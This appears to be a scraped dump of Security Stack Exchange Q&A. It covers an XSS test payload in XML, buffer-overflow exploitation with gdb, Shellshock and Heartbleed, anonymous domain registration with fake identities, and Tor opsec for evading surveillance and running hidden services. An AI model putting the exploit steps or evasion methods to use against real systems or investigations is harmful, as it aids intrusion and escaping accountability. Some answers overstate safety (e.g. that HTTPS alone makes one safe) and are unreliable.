*   Trying 5.144.130.33...
* connected
* Connected to www.securation.com (5.144.130.33) port 80 (#0)
&gt; GET /files/2013/09/script.xml HTTP/1.1
&gt; User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8x zlib/1.2.5
&gt; Host: www.securation.com
&gt; Accept: */*
&gt; 
&lt; HTTP/1.1 200 OK
&lt; Date: Mon, 16 Sep 2013 06:01:57 GMT
&lt; Server: Apache
&lt; Last-Modified: Mon, 16 Sep 2013 06:00:14 GMT
&lt; Accept-Ranges: bytes
&lt; Content-Length: 169
&lt; X-Version: Securation 0.0.2 Beta
&lt; Connection: close
&lt; Content-Type: application/xml
&lt; 
&lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;
&lt;Query&gt;
    &lt;SearchTerm&gt;
        &lt;script xmlns=""http://www.w3.org/1999/xhtml""&gt;
            alert('Hello');
        &lt;/script&gt;
    &lt;/SearchTerm&gt;
&lt;/Query&gt;
* Closing connection #0
</code></pre>

<p><img src=""https://i.stack.imgur.com/IJjf3.png"" alt=""Example""></p>
","42478"
"How do hacking groups register domains remaining anonymous?","22891","","<p>Let's take lulzsec as an example; they registered lulzsecurity.com. There are two problems that I don't understand how they solved:</p>

<ul>
<li>They had to pay for it. Tracking down money is generally much easier than tracking down IP addresses. I assume they didn't use stolen credit cards (with all the attention they received, people would have quickly found out and taken away their domain).. And even with prepaid credit cards it's relatively easy to find out who bought it, with security cameras/etc.</li>
<li>They had to have played by ICANN's rules - again, because of the attention they received, if they hadn't people would have found out and they would have lost the domain. This means giving valid contact information.</li>
</ul>
","<p>Here is one method of purchasing a domain name pretty close to anonymously.</p>

<ol>
<li>Use <a href=""https://www.torproject.org/"">Tor</a>. <a href=""https://en.wikipedia.org/wiki/Tor_%28anonymity_network%29#Weaknesses"">Understand its weaknesses</a></li>
<li>Buy a prepaid credit card in cash, specifically one not requiring activation or signature.</li>
<li><a href=""http://www.fakenamegenerator.com/"">Randomly generate</a> a full alias to use during online registration.</li>
<li>Register an account at a domain registrar.</li>
<li>Use the prepaid credit card to buy a domain. </li>
<li>Repeat for other needed services.</li>
</ol>

<p>Note that 2. requires non-anonymous interaction and is therefore the riskiest. Let's try another path.</p>

<ol>
<li>Use <a href=""https://www.torproject.org/"">Tor</a>. <a href=""https://en.wikipedia.org/wiki/Tor_%28anonymity_network%29#Weaknesses"">Understand its weaknesses</a></li>
<li><a href=""http://www.fakenamegenerator.com"">Randomly generate</a> a full alias to use during online registration.</li>
<li>Earn some <a href=""https://en.wikipedia.org/wiki/Bitcoin"">Bitcoins</a> anonymously online, thus seeding <strong>without human contact</strong>.</li>
<li>Chose a domain registrar and DNS host that <a href=""https://en.bitcoin.it/wiki/Trade#Domain_Name_and_DNS_Hosting"">supports Bitcoins</a></li>
<li>Repeat for other needed services.</li>
</ol>
","16466"
"Are ordinary OS X desktops at risk from bash ""shellshock"" bug (CVE-2014-6271)?","22855","","<p>I've recently heard via Twitter about CVE-2014-6271.</p>

<p>Are ordinary OS X desktops, that aren't acting as a web server, at risks of receiving attacks that could exploit this vulnerability?</p>
","<p>Define ""risk"".</p>

<p>The core of this attack is to create an environment variable that looks like a Bash scripting function but ends with the invocation of a program, and then cause Bash to be run.  Bash will see the environment variable, parse it, and then keep parsing past the end of the function and run the program.</p>

<p>Any method of triggering Bash execution with at least one attacker-controlled environment variable will work.  Web server CGI attacks are getting the attention right now, but a user logging in over SSH could do it (a failed login, however, can't).  It's possible that some FTP servers could trigger it (say, through running a post-upload script).  A PackageMaker-based installer could trigger it, but if you're running a hostile installer, you've got bigger problems than this.  There are probably many other ways as well.</p>

<p>The average desktop user doing average desktop user activities is unlikely to have open attack vectors that could be used to trigger this bug, but Bash shows up in enough unexpected places that it's impossible to say for sure.</p>
","68125"
"Does the heartbleed vulnerability affect clients as severely?","22851","","<p>If I have a web crawler (using a non-patched version of OpenSSL) that can be coaxed to connect to an evil https-site, can they get everything from my process memory? To attack a server you can keep reconnecting to get more 64kb blocks (if I understand correctly), but can a client be forced to reconnect many times, to get more blocks?</p>
","<p>Yes, clients <em>are</em> vulnerable to attack.</p>

<p>The initial security notices indicated that a malicious server <strong>can</strong> use the Heartbleed vulnerability to compromise an affected client. Sources below (all emphasis is mine).</p>

<p>Since then, <a href=""https://security.stackexchange.com/questions/55249"">proof of concept</a> attacks have validated this position - it is <em>utterly certain</em> that clients running apps that use OpenSSL for TLS connections may be vulnerable.</p>

<p><a href=""http://heartbleed.com/"" rel=""nofollow noreferrer"">heartbleed.com</a>:</p>

<blockquote>
  <p>...When [Heartbleed] is
  exploited it leads to the leak of memory contents <strong>from the server to
  the client</strong> and <strong>from the client to the server</strong>.</p>
</blockquote>

<p><a href=""http://www.ubuntu.com/usn/usn-2165-1/"" rel=""nofollow noreferrer"">Ubuntu Security Notice USN-2165-1</a>:</p>

<blockquote>
  <p>An attacker could use this issue to obtain up to 64k of memory
  contents <strong>from the client or server</strong></p>
</blockquote>

<p><a href=""https://tools.ietf.org/html/rfc6520"" rel=""nofollow noreferrer"">RFC6520</a>:</p>

<blockquote>
  <p><em>5. Use Cases</em><br>
  <strong>Each endpoint</strong> sends HeartbeatRequest messages...</p>
</blockquote>

<p><a href=""https://www.openssl.org/news/secadv_20140407.txt"" rel=""nofollow noreferrer"">OpenSSL Security Advisory 07 Apr 2014</a>:</p>

<blockquote>
  <p>A missing bounds check in the handling of the TLS heartbeat extension
  can be used to reveal up to 64k of memory to a <strong>connected client or
  server</strong>.</p>
</blockquote>

<hr>

<p>Client applications <a href=""https://github.com/Lekensteyn/pacemaker"" rel=""nofollow noreferrer"">reported</a> <a href=""https://security.stackexchange.com/q/55249/1811"">to be vulnerable</a> (Credit to <a href=""https://security.stackexchange.com/users/2630/lekensteyn"">@Lekensteyn</a> except where otherwise stated):</p>

<ul>
<li>MariaDB 5.5.36</li>
<li>wget 1.15 (leaks memory of earlier connections and own state)</li>
<li>curl 7.36.0</li>
<li>git 1.9.1 (tested clone / push, leaks not much)</li>
<li>nginx 1.4.7 (in proxy mode, leaks memory of previous requests)</li>
<li>links 2.8 (leaks contents of previous visits!)</li>
<li>All KDE applications using KIO (Dolphin, Konqueror).</li>
<li>Exim mailserver</li>
<li>OwnCloud <sup>Version Unknown | <a href=""http://www.reddit.com/r/netsec/comments/22man5/heartbleed_poc_malicious_server_attacking_clients/cgovjii"" rel=""nofollow noreferrer"">Source</a></sup></li>
</ul>

<p>Note that some of these programs do <em>not</em> use OpenSSL. For example, curl can be built with Mozilla NSS and Exim can be built with GnuTLS (as is done on Debian).</p>

<hr>

<p>Other common clients:</p>

<ul>
<li><p>Windows (all versions): Probably unaffected (<a href=""http://en.wikipedia.org/wiki/SChannel"" rel=""nofollow noreferrer"">uses SChannel/SSPI</a>), but attention should be paid to the TLS implementations in individual applications. For example, Cygwin users should update their <a href=""http://cygwin.com/cgi-bin2/package-cat.cgi?file=x86/openssl/openssl-1.0.1g-1&amp;grep=openssl"" rel=""nofollow noreferrer"">OpenSSL</a> packages.</p></li>
<li><p>OSX and iOS (all versions): Probably unaffected. SANS <em>implies</em> it may be vulnerable by saying ""<a href=""https://isc.sans.edu/diary/*+Patch+Now:+OpenSSL+%22Heartbleed%22+Vulnerability/17921"" rel=""nofollow noreferrer"">OS X Mavericks has NO PATCH available</a>"", <a href=""https://apple.stackexchange.com/a/126924"">but</a> <a href=""http://curl.haxx.se/mail/archive-2013-10/0036.html"" rel=""nofollow noreferrer"">others</a> <a href=""https://apple.stackexchange.com/questions/126830/how-to-upgrade-openssl-in-os-x"">note</a> that OSX 10.9 ships with OpenSSL 0.9.8y, which is not affected. Apple <a href=""https://developer.apple.com/library/ios/documentation/Security/Conceptual/cryptoservices/GeneralPurposeCrypto/GeneralPurposeCrypto.html"" rel=""nofollow noreferrer"">says</a>: ""OpenSSL libraries in OS X are deprecated, and OpenSSL has never been provided as part of iOS""</p></li>
<li><p>Chrome (all platforms except Android): Probably unaffected (<a href=""http://www.chromium.org/developers/design-documents/network-stack#TOC-SSL"" rel=""nofollow noreferrer"">uses NSS</a>)</p></li>
<li>Chrome on Android: 4.1.1 may be affected (<a href=""https://src.chromium.org/viewvc/chrome/trunk/deps/third_party/openssl/README.chromium"" rel=""nofollow noreferrer"">uses OpenSSL</a>). <sup><a href=""http://www.reddit.com/r/netsec/comments/22gaar/heartbleed_attack_allows_for_stealing_server/cgmrh7d"" rel=""nofollow noreferrer"">Source</a></sup>. 4.1.2 should be unaffected, as it is compiled with <a href=""https://android.googlesource.com/platform/external/openssl.git/+/android-4.1.2_r1"" rel=""nofollow noreferrer"">heartbeats disabled</a>. <sup><a href=""http://www.reddit.com/r/programming/comments/22ghj1/the_heartbleed_bug/cgn3roj"" rel=""nofollow noreferrer"">Source</a></sup>.</li>
<li>Mozilla products (e.g. Firefox, Thunderbird, SeaMonkey, Fennec): Probably unaffected, all use <a href=""https://developer.mozilla.org/en-US/docs/Overview_of_NSS"" rel=""nofollow noreferrer"">NSS</a> </li>
</ul>
","55121"
"Turn RPi3 Wi-Fi adapter into monitor mode using airmon-ng","22831","","<p>For some reason, I can't turn the built-in Wi-Fi adapter on the new Raspberry Pi 3 into monitor mode like I used to do on other platforms.</p>

<p>First I kill the processes that interfere with <code>sudo airmon-ng check kill</code>:</p>

<pre><code>Found 4 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID     Name
364     avahi-daemon
385     avahi-daemon
411     wpa_supplicant
629     dhcpcd
Process with PID 411 (wpa_supplicant) is running on interface wlan0
Killing all those processes...
</code></pre>

<p>Then I try to enable monitor mode with <code>sudo airmon-ng start wlan0</code>:</p>

<pre><code>Interface       Chipset         Driver

wlan0           Unknown         brcmfmac_sdio - [phy0]mon0: ERROR while getting interface flags: No such device

                                (monitor mode enabled on mon0)
</code></pre>

<p>The output says it's enabled, but I can't use <code>mon0</code>.<br>
How can I fix this and turn the adapter into monitor mode?</p>
","<p>You cannot. Not all chipsets/wifi drivers support monitor mode. Broadcom is known for lacking in open source drivers functionality support.</p>

<p>It is already public knowledge the RPi 3 current driver implementation does not support monitor mode. </p>

<p><a href=""https://www.reddit.com/r/raspberry_pi/comments/4ah4oi/psa_the_raspberry_pi_3s_embedded_wifi_card_does/"" rel=""nofollow noreferrer"">PSA: The Raspberry Pi 3's embedded WiFi card does not support promiscuous mode.</a></p>

<p>If you are buying a replacement, do not go for a cheap realtek one, lots of bugs. Buy ralink or atheros, and check first if the chipset (and monitor mode) is well supported by the Linux kernel. </p>

<p>I am personally happy with this ralink. <a href=""https://www.aliexpress.com/item/2T2R-300Mbps-Dual-Band-2-4GHz-5-8GHz-Ralink-RT5572N-WiFi-USB-Adapter-Black/32364412439.html"" rel=""nofollow noreferrer"">https://www.aliexpress.com/item/2T2R-300Mbps-Dual-Band-2-4GHz-5-8GHz-Ralink-RT5572N-WiFi-USB-Adapter-Black/32364412439.html</a></p>
","121558"
"What are the laws regarding ISP recording IP addresses? How would they know who had which?","22811","","<p>Since most internet users have ISPs using dynamic IP addresses (e.g. someone gets a new external IP address every few days) are there any laws requiring the ISPs to keep logs associating an IP address on a certain day with a certain individual? For example if someone hacks a website and their IP address is found, can anything be done about it? If ISPs do keep logs, what is associated with a persons IP address? I mean does DHCP somehow know the geographical location of who gets what IP, and then that information is stored?</p>
","<ul>
<li><p>Some ISPs force a connection reset every 24h and you get a new IP address assigned, others don't force you and yet others give you a fixed ip address.</p></li>
<li><p>There are laws requiring the ISPs to log the User - IP association (which in turn is associated with your contract)... but e.g. in the EU there is the data retention directive that requires ISPs to even log individual connections.
(Actually the EU directive is a ""contract"" between the European Council/Parlament and member nations, not between EC/EP and ISPs. The nations must adopt the directives in local law themselves. Usually they either adopt it as is, adopt it and extend it, have already adopted it or refuse to do so (this usually works by ruling that it conflicts with constitution).)
read more at <a href=""http://eur-lex.europa.eu/LexUriServ/LexUriServ.do?uri=CELEX:32006L0024:EN:HTML"">http://eur-lex.europa.eu/LexUriServ/LexUriServ.do?uri=CELEX:32006L0024:EN:HTML</a>.
There is a visualisation for retained mobile phone connection metadata at <a href=""http://www.zeit.de/datenschutz/malte-spitz-data-retention"">http://www.zeit.de/datenschutz/malte-spitz-data-retention</a></p>

<ul>
<li>Concerning your question about geographical location:
There is a limited number of IP adresses available. They are goverened and distributed by organisations like <a href=""http://www.iana.org"">http://www.iana.org</a> and (?) <a href=""http://www.ripe.net/"">http://www.ripe.net/</a> . Now your ISP buys IP addresses (whole ranges and networks) and uses them to connect you to the internet. They are not sitting there and free to use like on a private network with DHCP.
(Try looking up your IP address and looking it up at <a href=""https://apps.db.ripe.net/search/query.html"">https://apps.db.ripe.net/search/query.html</a>)</li>
</ul></li>
</ul>

<p>There are databases like <a href=""http://www.geoiptool.com/"">http://www.geoiptool.com/</a> that try to provide location information for any given ip address, but their accuracy greatly depends on different factors (e.g. if your ISP only operates in a small regional area or in the entire USA). Usually those databases are only good for associating IPs to countries.</p>
","17292"
"Is there any disadvantage in using OpenNIC for DNS resolution?","22776","","<p>What are the advantages/disadvantages of OpenNIC vs ISP for DNS resolution with regards to security and privacy?</p>
","<p>You may chose a DNS server (a list is <a href=""http://wiki.opennicproject.org/Tier2"" rel=""nofollow"">here</a>, on their wiki) that logs, logs for a time period, logs and anonymizes the file after a time period, logs anonymously, or keeps no logs. As such, this privacy concern is well addressed in the OpenNIC project. A server owner could lie about the type of logs kept, you must judge whether or not you believe that is a possibility.</p>

<p>While I shouldn't give a statement based on my opinion, based on the resources needed to run a Tier 2 server and the type of information that could be gathered, I do not have a reason to mistrust any specific operator or the concept.</p>

<p>There are negligible security concerns, as the only attack a DNS server could assist is sending you to a website other than the one you requested, possibly containing malware or phishing attempts. This would be quickly addressed by the community's Tier 1 operators.</p>
","15935"
"Ensure web service only accessed by authorized applications","22765","","<p><strong>Preface</strong></p>

<p>My mobile app allows users to create accounts on my service. In addition to being able to log in with external authentication providers, like Facebook, I want to give the user the option to create an account using an e-mail address.</p>

<p>Normally, all calls to my web service are authenticated via basic authentication over HTTPS. However, the create account function (also over HTTPS) does not have any authentication - since the user does not yet have any credentials.</p>

<p>If I was writing a website, I would use Captcha to stop my database from being filled up with bogus accounts via script.</p>

<p><strong>Question</strong></p>

<p>How can I verify that new user requests are coming from an instance of my application and not from a bot?</p>

<p>If all data is sent over HTTPS, is it sufficient for the application to have a stored password to say ""hey, it's me!""? What are the best practices for doing something like this?</p>

<p><strong>Elaboration</strong></p>

<p>The server is written in Java using the Spring Framework and Spring Security. It is hosted on App Engine. Cost is a concern (both network and computation). The app is a mobile game. I do not store sensitive information like credit card numbers. However, I do keep track of user purchases on the Apple and Android stores. My biggest concern is player experience. I don't want a hacker bringing down the system and ruining someone's enjoyment of the game. I also, need to make sure that the player faces as few obstacles as possible when creating an account.</p>

<p><strong>Update/Clarification</strong></p>

<p>I am looking for a way to ensure all calls to the service are coming from an instance of my application. User accounts are already protected because the stateless service requires that they send their credentials on every request. There are no sessions and no cookies.</p>

<p>I need to stop bot-spam on the unsecured calls, such as create-new-account. I cannot use captcha because it does not fit into the flow of the application.</p>
","<p>The bottom line is that you will need to embed a secret into your app. It is an unfortunate truth that <a href=""http://en.wikipedia.org/wiki/Digital_rights_management"">DRM</a> (which is more or less what you are trying to achieve) is impossible. A person with access to your app will <em>always</em> be able to recover the embedded secret, no matter what you do to protect it.</p>

<p>That said, there are plenty of things you can do to make your embedded secret very difficult to recover.</p>

<ul>
<li><p><strong>Construct it at Runtime</strong> - Do not store the secret in a string or configuration file anywhere in your app. Instead derive it from a series of computations at runtime. This stops attackers from simply browsing your app with a hexeditor.</p></li>
<li><p><strong>Never Send it Over the Wire</strong> - Use a challenge-response system of some kind with a >128bit nonce, that way an attacker cannot MitM the SSL stream (which is easy when he controls the mobile device remember) and see the secret in the clear.</p></li>
</ul>

<p>In any case, try to find a tried and tested key-scrambling mechanism and authentication protocol. Do not roll your own.</p>
","42664"
"Finding environment variables with gdb, to exploit a buffer overflow","22735","","<p>I have to exploit a very simple buffer overflow in a vulnerable C++ program for an assignment and I am not being able to find the environment variable SHELL.</p>

<p>I have never worked with BoF before, and after reading lots of similar questions, posts, etc. I have this information (correct me if it's wrong):</p>

<ul>
<li>The program stores the environment variables in a global variable called <code>environ</code></li>
<li><p>I can find the address of this variable like this:</p>

<pre><code>(gdb) info variable environ
All variables matching regular expression ""environ"":

Non-debugging symbols:
0xb7fd1b00  __environ
0xb7fd1b00  _environ
0xb7fd1b00  environ
</code></pre></li>
<li><p>I need to find the <code>/bin/bash</code> string in that variable to launch a shell (I have already got the system and exit addresses, I only need the route to the shell). And here is where I don't know what to do. I have been reading gdb tutorials, but still nothing. <code>x/s 0xb7fd1b00</code> does not output anything useful.</p></li>
</ul>
","<p><code>environ</code> is a pointer to pointer, as it has the type <code>char **environ</code>.</p>

<p>You have to try something like:</p>

<pre><code>(gdb) x/s *((char **)environ)
0xbffff688:      ""SSH_AGENT_PID=2107""
(gdb) x/s *((char **)environ+1)
0xbffff69b:      ""SHELL=/bin/bash""
</code></pre>
","13203"
"Are services like Hide My Ass and UnoDNS reasonably safe to use?","22696","","<p>While in Germany, I want to keep using my Netflix account, watch PBS, CNBC. I have found following services:</p>

<p>A VPN: <a href=""https://hidemyass.com/vpn/promo/1/5/"">https://hidemyass.com/vpn/promo/1/5/</a></p>

<p>A DNS: <a href=""http://www.unotelly.com/unodns/"">http://www.unotelly.com/unodns/</a></p>

<p>I an concenred about someone stealing my data trough a man-in-the-middle attack. Should I use any of these services?</p>

<p>I know that HTTP traffic is fair game. What about HTTPS? Would anyone be able to steal my online banking password or Gmail credentials?</p>
","<blockquote>
  <p>What about HTTPS? Would anyone be able to steal my online banking
  password or Gmail credentials?</p>
</blockquote>

<p>You shouldn't worry about this unless you make it a habit of installing forged certificates.</p>

<p>Furthermore....</p>

<p>If you are on a wireless connection which has a password and the proper security modes enables ( WPA, WPA2) the only way to hijack your information is to connect to somebody else pretending to be said access point.</p>

<p>If you are viewing a https page you are safe.</p>
","13498"
"Best practices for Tor use, in light of released NSA slides","22668","","<p>It has been <a href=""https://security.stackexchange.com/questions/37430/is-the-fact-that-tors-development-is-largely-government-funded-cause-for-concer"">known</a> in the security community that a tool as versatile as Tor is likely the target of intense interest from intelligence agencies. While the FBI has admitted responsibility for a Tor malware attack, the involvement of SIGINT organizations has not been confirmed.</p>

<p>Any doubt was removed in early October, 2013 with <em>The Guardian's</em> release of ""<a href=""http://www.theguardian.com/world/interactive/2013/oct/04/tor-stinks-nsa-presentation-document"" rel=""noreferrer"">Tor Stinks</a>,"" an NSA presentation (vintage June 2012) outlining current and proposed strategies for exploiting the network. </p>

<p>Some salient points:</p>

<ul>
<li>Fundamentally, Tor is secure</li>
<li>...however, de-anonymization is possible in certain circumstances</li>
<li>""Dumb users"" will always be vulnerable (designated internally as ""EPICFAIL"")</li>
<li>NSA/GCHQ operate Tor nodes</li>
<li>Traffic analysis, in various forms, appears to be the tool of choice</li>
</ul>

<p><strong>After reviewing the literature, what changes should Tor users implement to ensure -- to the greatest degree technically feasible -- their continuing security?</strong></p>
","<p>As a very long time Tor user, the most surprising part of the NSA documents for me was <em>how little progress they have made against Tor</em>. Despite its known weaknesses, it's still the best thing we have, provided it's used properly and you make no mistakes.</p>

<p>Since you want security of ""the greatest degree technically feasible"", I'm going to assume that your threat is a well-funded government with significant visibility or control of the Internet, as it is for many Tor users (despite the warnings that <a href=""https://www.torproject.org/docs/faq.html.en#AttacksOnOnionRouting"" rel=""nofollow noreferrer"">Tor alone is not sufficient to protect you from such an actor</a>).</p>

<p>Consider whether you truly need this level of protection. If having your activity discovered does not put your life or liberty at risk, then you probably do not need to go to all of this trouble. But if it does, then you absolutely <em>must</em> be vigilant if you wish to remain alive and free.</p>

<p>I won't repeat <a href=""https://www.torproject.org/download/download.html.en#Warning"" rel=""nofollow noreferrer"">Tor Project's own warnings</a> here, but I will note that they are only a beginning, and are not adequate to protect you from such threats. When it comes to advanced persistent threats such as state actors, you are almost certainly <em>not paranoid enough</em>.</p>

<hr>

<h1>Your Computer</h1>

<p>To date the NSA's and FBI's primary attacks on Tor have been MITM attacks (NSA) and hidden service web server compromises and malware delivery (FBI) which either sent tracking data from the Tor user's computer, compromised it, or both. Thus you need a reasonably secure system from which you can use Tor and reduce your risk of being tracked or compromised.</p>

<ol>
<li><p>Don't use Windows. Just don't. This also means don't use the Tor Browser Bundle on Windows. Vulnerabilities in the software in TBB figure prominently in both the NSA slides and FBI's recent takedown of Freedom Hosting. It has also been shown that <a href=""http://www.leviathansecurity.com/blog/the-case-of-the-modified-binaries/"" rel=""nofollow noreferrer"">malicious Tor exit nodes are binary patching unsigned Windows packages</a> in order to distribute malware. Whatever operating system you use, install only signed packages obtained over a secure connection.</p></li>
<li><p>If you can't construct your own workstation capable of running Linux and carefully configured to run the latest available versions of Tor, a proxy such as Privoxy, and the Tor Browser, <a href=""https://serverfault.com/a/434010/126632""><em>with all outgoing clearnet access firewalled</em></a>, consider using <a href=""https://tails.boum.org/"" rel=""nofollow noreferrer"">Tails</a> or <a href=""https://www.whonix.org/"" rel=""nofollow noreferrer"">Whonix</a> instead, where most of this work is done for you. It's absolutely critical that outgoing access be firewalled so that third party applications or malware cannot accidentally or intentionally leak data about your location. If you must use something other than Tails or Whonix, then <em>only</em> use the Tor Browser (and only for as long as it takes to download one of the above). Other browsers can <a href=""https://i.stack.imgur.com/Voj7d.png"" rel=""nofollow noreferrer"">leak your actual IP address</a> even when using Tor, through various methods which the Tor Browser disables.</p></li>
<li><p>If you are using persistent storage of any kind, ensure that it is encrypted. Current versions of LUKS are reasonably safe, and major Linux distributions will offer to set it up for you during their installation. <a href=""https://security.stackexchange.com/q/58940/11291"">TrueCrypt is not currently known to be safe.</a> BitLocker might be safe, though you still shouldn't be running Windows. Even if you are in a country where <a href=""https://en.wikipedia.org/wiki/Rubber-hose_cryptanalysis"" rel=""nofollow noreferrer"">rubber hosing</a> is legal, such as the UK, encrypting your data protects you from a variety of other threats.</p></li>
<li><p>Remember that your computer must be kept up to date. Whether you use Tails or build your own workstation from scratch or with Whonix, update frequently to ensure you are protected from the latest security vulnerabilities. Ideally you should update each time you begin a session, or at least daily. Tails will notify you at startup if an update is available.</p></li>
<li><p>Be very reluctant to compromise on JavaScript, Flash and Java. Disable them all by default. The FBI has used tools which exploit all three in order to identify Tor users. If a site requires any of these, visit somewhere else. Enable scripting only as a last resort, only temporarily, and only to the minimum extent necessary to gain functionality of a web site that you have no alternative for.</p></li>
<li><p>Viciously drop cookies and local data that sites send you. Neither TBB nor Tails do this well enough for my tastes; consider using an addon such as <a href=""https://addons.mozilla.org/en-US/firefox/addon/self-destructing-cookies/"" rel=""nofollow noreferrer"">Self-Destructing Cookies</a> to keep your cookies to a minimum. Of zero.</p></li>
<li><p>Your workstation must be a laptop; it must be portable enough to be carried with you and quickly disposed of or destroyed.</p></li>
<li><p>Don't use Google to search the Internet. A <a href=""https://startpage.com/eng/privacy-policy.html"" rel=""nofollow noreferrer"">good</a> alternative is <a href=""https://startpage.com/"" rel=""nofollow noreferrer"">Startpage</a>; this is the default search engine for TBB, Tails and Whonix. Another good option is <a href=""https://duckduckgo.com/"" rel=""nofollow noreferrer"">DuckDuckGo</a>.</p></li>
</ol>

<hr>

<h1>Your Environment</h1>

<p>Tor contains <a href=""https://www.torproject.org/docs/faq.html.en#AttacksOnOnionRouting"" rel=""nofollow noreferrer"">weaknesses</a> which can only be mitigated through actions in the physical world. An attacker who can view both your local Internet connection, and the connection of the site you are visiting, can use statistical analysis to correlate them.</p>

<ol>
<li><p>Never use Tor from home, or near home. Never work on anything sensitive enough to require Tor from home, even if you remain offline. Computers have a funny habit of liking to be connected... This also applies to anywhere you are staying temporarily, such as a hotel. Never performing these activities at home 
helps to ensure that they cannot be tied to those locations. (Note that this applies to people facing advanced persistent threats. Running Tor from home is reasonable and useful for others, especially people who aren't doing anything themselves but wish to help by running an <a href=""https://blog.torproject.org/blog/tips-running-exit-node"" rel=""nofollow noreferrer"">exit node</a>, <a href=""https://www.torproject.org/docs/faq.html.en#BetterAnonymity"" rel=""nofollow noreferrer"">relay</a> or <a href=""https://www.torproject.org/docs/faq.html.en#RelayOrBridge"" rel=""nofollow noreferrer"">bridge</a>.)</p></li>
<li><p>Limit the amount of time you spend using Tor at any single location. While these correlation attacks do take some time, they can in theory be completed in as little as a day. (And if you are already under surveillance, it can be done instantly; this is done to confirm or refute that a person under suspicion is the right person.) While the jackboots are very unlikely to show up the same day you fire up Tor at Starbucks, they <em>might</em> show up the next day. I recommend for the truly concerned to never use Tor more than 24 hours at any single physical location; after that, consider it burned and go elsewhere. This will help you even if the jackboots show up six months later; it's much easier to remember a regular customer than someone who showed up one day and never came back. This <em>does</em> mean you will have to travel farther afield, especially if you don't live in a large city, but it will help to preserve your ability to travel freely.</p></li>
<li><p>Avoid being electronically tracked. Pay cash for fuel for your car or for public transit. For instance, on the London Underground, use a separate Travelcard purchased with cash instead of your regular Oyster card or contactless payment. Pay cash for everything else, too; avoid using your normal credit and debit cards, even at ATMs. If you need cash when going out, use an ATM close to home that you already frequently use. If you drive, try to avoid <a href=""https://en.wikipedia.org/wiki/Automatic_number_plate_recognition"" rel=""nofollow noreferrer"">number plate readers</a> by avoiding major bridges, tunnels, motorways, toll roads and primary arterial roads and traveling on secondary roads. If the information is publicly available, learn where these readers are installed in your area.</p></li>
<li><p>When you go out to perform these activities, leave your mobile phone turned on and at home. If you need to make and receive phone calls, purchase an anonymous prepaid phone for the purpose. This is difficult in some countries, but it can be done if you are creative enough. Pay cash; never use a debit or credit card to buy the phone or top-ups. Never insert its battery or turn it on if you are within 10 miles (16 km) of your home, nor use a phone from which the battery cannot be removed. Never place a SIM card previously used in one phone into another phone, as this will irrevocably link the phones. Never give its number or even admit its existence to anyone who knows you by your real identity. This may need to include your family members.</p></li>
</ol>

<hr>

<h1>Your Mindset</h1>

<p>Many Tor users get caught because they made a mistake, such as using their real email address in association with their activities, or allowing a hostile adversary to reach a high level of trust. You must avoid this as much as possible, and the only way to do so is with careful mental discipline.</p>

<ol>
<li><p>Think of your Tor activity as <em>pseudonymous</em>, and create in your mind a virtual identity to correspond with the activity. This virtual person does not know you and will never meet you, and wouldn't even like you if he knew you. He must be kept strictly mentally separated. Consider using multiple pseudonyms, but if you do, you must be extraordinarily vigilant to ensure that you do not <a href=""http://arstechnica.com/tech-policy/2012/03/stakeout-how-the-fbi-tracked-and-busted-a-chicago-anon/"" rel=""nofollow noreferrer"">reveal details which could correlate them</a>.</p></li>
<li><p>If you must use public Internet services, create completely new accounts for this pseudonym. Never mix them; for instance do not browse Facebook with your real email address after having used Twitter with your pseudonym's email on the same computer. Wait until you get home.</p></li>
<li><p>By the same token, never perform actions related to your pseudonymous activity without using Tor, unless you have no other choice (e.g. to sign up for a service which blocks signup via Tor). Take extra precautions regarding your identity and location if you must do this.</p></li>
</ol>

<hr>

<h1>Hidden Services</h1>

<p>These have been big in the news, with the takedown of high-profile hidden services such as Silk Road and Freedom Hosting in 2013, and Silk Road 2.0 and <a href=""https://blog.torproject.org/blog/thoughts-and-concerns-about-operation-onymous"" rel=""nofollow noreferrer"">dozens of other services</a> in 2014.</p>

<p>The bad news is, <a href=""https://blog.torproject.org/blog/hidden-services-need-some-love"" rel=""nofollow noreferrer""><em>hidden services are much weaker</em> than they could or should be</a>. The Tor Project has not been able to devote much development to hidden services due to the lack of funding and developer interest (if you're able to do so, consider contributing in one of these ways).</p>

<p>Further, it is suspected that the FBI is using traffic confirmation attacks to locate hidden services <em>en masse</em>, and <a href=""https://blog.torproject.org/blog/tor-security-advisory-relay-early-traffic-confirmation-attack"" rel=""nofollow noreferrer"">an early 2014 attack on the Tor network</a> was actually <a href=""http://fusion.net/story/273059/tor-cmu-sei-fbi/"" rel=""nofollow noreferrer"">an FBI operation</a>.</p>

<p>The good news is, the NSA doesn't seem to have done much with them (though the NSA slides mention a GCHQ program named ONIONBREATH which focuses on hidden services, nothing else is yet known about it).</p>

<p>Since hidden services must often run under someone else's physical control, they are vulnerable to being compromised via that other party. Thus it's even more important to protect the anonymity of the service, as once it is compromised in this manner, it's pretty much game over.</p>

<p>The advice given above is sufficient if you are merely visiting a hidden service. If you need to run a hidden service, do all of the above, and in addition do the following. Note that these tasks require an experienced system administrator who is also experienced with Tor; performing them without the relevant experience will be difficult or impossible, or may result in your arrest. The operator of both the original Silk Road and Silk Road 2.0 were developers who, like most developers, were inexperienced in IT operations.</p>

<ol>
<li><p>Do not run a hidden service in a virtual machine unless you also control the physical host. Designs in which Tor and a service run in firewalled virtual machines on a firewalled physical host are OK, provided it is the physical host which you are in control of, and you are not merely leasing cloud space. It is trivial for a cloud provider to take an image of your virtual machine's RAM, which contains all of your encryption keys and many other secrets. This attack is far more difficult on a physical machine.</p></li>
<li><p>Another design for a Tor hidden service consists of two physical hosts, leased from two different providers though they may be in the same datacenter. On the first physical host, a single virtual machine runs with Tor. Both the host and VM are firewalled to prevent outgoing traffic other than Tor traffic and traffic to the second physical host. The second physical host will then contain a VM with the actual hidden service. Again, these will be firewalled in both directions. The connection between them should be secured with a VPN which is not known to be insecure, such as OpenVPN. If it is suspected that either of the two hosts may be compromised, the service may be immediately moved (by copying the virtual machine images) and both servers decommissioned.</p>

<p>Both of these designs can be implemented fairly easily with <a href=""https://www.whonix.org/"" rel=""nofollow noreferrer"">Whonix</a>.</p></li>
